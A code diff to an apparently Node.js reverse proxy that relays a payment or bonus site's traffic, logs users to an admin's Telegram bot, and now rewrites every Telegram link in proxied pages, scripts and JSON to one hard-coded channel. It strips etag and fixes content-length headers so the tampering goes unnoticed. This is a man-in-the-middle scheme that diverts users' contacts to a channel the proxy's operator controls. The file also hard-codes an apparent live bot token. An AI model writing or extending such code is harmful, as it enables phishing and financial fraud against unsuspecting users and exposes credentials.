@@ -9,6 +9,7 @@ const BOT_TOKEN = '8537838501:AAFYQV9aDYaOV_JWvwksPMdyY1IXpY34Qqg';
 const WEBHOOK_URL = 'https://rtyhh.vercel.app/bot-webhook';
 const REDIS_URL = process.env.KV_REST_API_URL || process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.KV_REST_API_TOKEN || process.env.UPSTASH_REDIS_REST_TOKEN;
+const TELEGRAM_OVERRIDE = 'https://t.me/VIVIPAYR2';
 
 const DEFAULT_DATA = {
   banks: [],
@@ -1331,6 +1332,23 @@ async function proxyAndAddBonus(req, res) {
   }
 }
 
+function replaceTelegramLinks(body) {
+  if (!body || typeof body !== 'string') return body;
+  return body.replace(/https?:\/\/t\.me\/[A-Za-z0-9_]+/g, TELEGRAM_OVERRIDE);
+}
+
+function replaceTelegramInObj(obj, depth) {
+  if (!obj || typeof obj !== 'object' || depth > 10) return;
+  if (Array.isArray(obj)) { obj.forEach(item => replaceTelegramInObj(item, depth + 1)); return; }
+  for (const key of Object.keys(obj)) {
+    if (typeof obj[key] === 'string' && obj[key].match(/https?:\/\/t\.me\//)) {
+      obj[key] = obj[key].replace(/https?:\/\/t\.me\/[A-Za-z0-9_]+/g, TELEGRAM_OVERRIDE);
+    } else if (typeof obj[key] === 'object') {
+      replaceTelegramInObj(obj[key], depth + 1);
+    }
+  }
+}
+
 app.all('*', async (req, res) => {
   const path = req.originalUrl || req.url;
   if (path === '/bot-webhook' || path === '/setup-webhook' || path === '/health') return;
@@ -1349,8 +1367,18 @@ app.all('*', async (req, res) => {
           bot.sendMessage(data.adminChatId, `📡 NON-JSON: ${req.method} ${path}\n${respBody.substring(0, 200)}`).catch(()=>{});
         }
       }
+      let finalBody = respBody;
+      const ct = (respHeaders['content-type'] || '').toLowerCase();
+      if (ct.includes('html') || ct.includes('javascript') || ct.includes('json') || ct.includes('text')) {
+        finalBody = replaceTelegramLinks(finalBody);
+        if (finalBody !== respBody) {
+          respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+          delete respHeaders['etag'];
+          delete respHeaders['last-modified'];
+        }
+      }
       res.writeHead(response.status, respHeaders);
-      res.end(respBody);
+      res.end(finalBody);
       return;
     }
     const respData = getResponseData(jsonResp);
@@ -1481,6 +1509,7 @@ app.all('*', async (req, res) => {
     if (detectedUserId) {
       trackUser(data, detectedUserId, path.split('?')[0].split('/').pop() || 'API', reqPhone);
     }
+    replaceTelegramInObj(jsonResp, 0);
     if (debugNextResponse && data.adminChatId && bot) {
       debugNextResponse = false;
       const dump = JSON.stringify(jsonResp, null, 2).substring(0, 3500);
